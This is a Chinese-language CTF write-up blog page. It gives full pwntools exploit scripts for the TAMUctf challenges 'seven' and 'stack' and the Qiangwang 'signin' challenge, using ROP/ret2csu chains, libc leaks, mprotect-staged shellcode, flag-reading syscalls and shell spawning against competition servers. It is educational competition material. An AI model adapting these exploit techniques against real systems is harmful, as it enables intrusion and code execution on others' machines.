class="line"></span><br><span class="line">payload = p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload += p64(text_offset + 0x134A)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss + <span class="number">0x8</span>) + p64(lev_ret)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, change(payload))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvlines(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = p64(pop_rdi)</span></span><br><span class="line"><span class="string">payload += p64(sh)</span></span><br><span class="line"><span class="string">payload += p64(sys)</span></span><br><span class="line"><span class="string">p.sendafter(b&quot;characters):\n\n&quot;, change(payload))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span> + <span class="number">0x90</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line">puts_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys, sh = search_from_libc(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">ls(text_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>接下来是两个shellcode编写，个人认为最有意思的部分</p>
</blockquote>
<h1 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h1><p>条件极为苛刻，只允许写入7个字节，而且shellcode段在跳转前取消了写权限。<br>在这种情况下构造mprotect + read组合进一步写入是无法做到的（即使借助现有寄存器），拿shell更是不可能。<br>转换思路，我们可以手动构造一个栈溢出漏洞，然后用栈溢出的思路去解题。</p>
<p>分析寄存器条件，可以构造如下shellcode作为一个很长的栈溢出漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov edi, eax</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>ret返回地址会直接落在我们输入的位置上，正好这个题有csu，通过csu完成mprotect + read,往shellcode段读入shellcode后再跳转过去即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./seven/seven&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_seven&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send(asm(payload))</span><br><span class="line">mprotect = elf.got[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = csu(edi=<span class="number">0x500000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=mprotect)</span><br><span class="line">payload += csu(edi=<span class="number">0x0</span>, rsi=<span class="number">0x500000</span>, rdx=<span class="number">0x500</span>, r12=read)</span><br><span class="line">payload += p64(<span class="number">0x500000</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># 7478742e67616c662f2e0a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = (</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    + sendfile</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2.5</span>)</span><br><span class="line">p.send(asm(orw))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><blockquote>
<p>个人认为最有意思的题目</p>
</blockquote>
<p>直接看C源码，发现题目只允许push&#x2F;pop操作，操作寄存器必须以”r”开头<br>专门去看了intel的开发手册，发现允许内容就是只有push&#x2F;pop rax~r15(包括rsp)这几个</p>
<p>个人认为如果真仅仅用这几个操作确实是无法get shell的（连syscall都无法做到），解决方案在栈上。</p>
<p>思路是构造read syscall再次读入shellcode来绕过过滤。通过各种栈操作我们可以设置合适的rdi,rsi,rdx和rax值，只差syscall<br>而syscall的汇编为<code>\x0f\x05</code>，事实上我们可以在栈上创造一个<code>\x0f\x05</code>，就是将输入长度补齐到0x50f;<br>分析源码可以发现在栈上有一个变量是存储输入长度的（调试发现就在栈顶），如果该值为0x50f，在小端序下便是<code>\x0f\x05</code>，通过栈操作我们可以把它push到shellcode段作为syscall使用。</p>
<p>之后再传入正常的shellcode即可，注意要恢复rsp,不然栈空间可能不足</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./stack/stack&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_stack&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push r8 ~ r15: \x41\x50 ~ \x41\x57</span></span><br><span class="line"><span class="string">pop r8 ~ r15: \x41\x58 ~ \x41\x5f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000000000:  50    push rax</span></span><br><span class="line"><span class="string">0x0000000000000001:  51    push rcx</span></span><br><span class="line"><span class="string">0x0000000000000002:  52    push rdx</span></span><br><span class="line"><span class="string">0x0000000000000003:  53    push rbx</span></span><br><span class="line"><span class="string">0x0000000000000004:  54    push rsp</span></span><br><span class="line"><span class="string">0x0000000000000005:  55    push rbp</span></span><br><span class="line"><span class="string">0x0000000000000006:  56    push rsi</span></span><br><span class="line"><span class="string">0x0000000000000007:  57    push rdi</span></span><br><span class="line"><span class="string">0x0000000000000008:  58    pop  rax</span></span><br><span class="line"><span class="string">0x0000000000000009:  59    pop  rcx</span></span><br><span class="line"><span class="string">0x000000000000000a:  5A    pop  rdx</span></span><br><span class="line"><span class="string">0x000000000000000b:  5B    pop  rbx</span></span><br><span class="line"><span class="string">0x000000000000000c:  5C    pop  rsp</span></span><br><span class="line"><span class="string">0x000000000000000d:  5D    pop  rbp</span></span><br><span class="line"><span class="string">0x000000000000000e:  5E    pop  rsi</span></span><br><span class="line"><span class="string">0x000000000000000f:  5F    pop  rdi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = asm(shell)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50F</span>, <span class="string">b&quot;\x50&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, rbp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x12</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/20/2024qwntb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/20/2024qwntb/" class="post-title-link" itemprop="url">[第七届“强网”拟态防御国际精英挑战赛-线上预选赛] Pwn writeup（部分）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-20 18:03:35 / Modified: 18:16:17" itemprop="dateCreated datePublished" datetime="2024-10-20T18:03:35+08:00">2024-10-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>和强网杯整混了，还以为qwb的pwn怎么变简单了</p>
</blockquote>
<p>这次虽然有两个菜单堆类似物（kernel除外），但没有一个和堆利用有关。风向要变了？</p>
<hr>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><blockquote>
<p>一开始附件给错了，换完附件后发现差距不大，拿了二血</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./signin_t/vuln&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./signin_t/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line">libc_dll.srand(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-5419033d36.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0401870</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    res = libc_dll.rand() % <span class="number">100</span> + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;code:\n&quot;</span>, p8(res))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Index: \n&quot;</span>, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Note: \n&quot;</span>, <span class="string">b&quot;aaaabbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln_addr = elf.sym.o_O</span><br><span class="line">read_addr = <span class="number">0x4013CF</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401893</span></span><br><span class="line">lev_ret = <span class="number">0x00000000004013BE</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - libc.sym.puts</span><br><span class="line">mprotect_addr = libc_base + libc.sym.mprotect</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x404500</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">inc rax;</span></span><br><span class="line"><span class="string">mov rsi, 0x404600;</span></span><br><span class="line"><span class="string">mov rdx, 0x50;</span></span><br><span class="line"><span class="string">mov rdi, 1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">ls(libc_base)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = csu(edi=<span class="number">0x404000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=<span class="number">0x404510</span>, mode=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x404480</span>)</span><br><span class="line">payload += asm(shell)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&quot;x&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x108</span>)</span><br><span class="line">payload += p64(lev_ret)</span><br><span class="line">payload += p64(mprotect_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

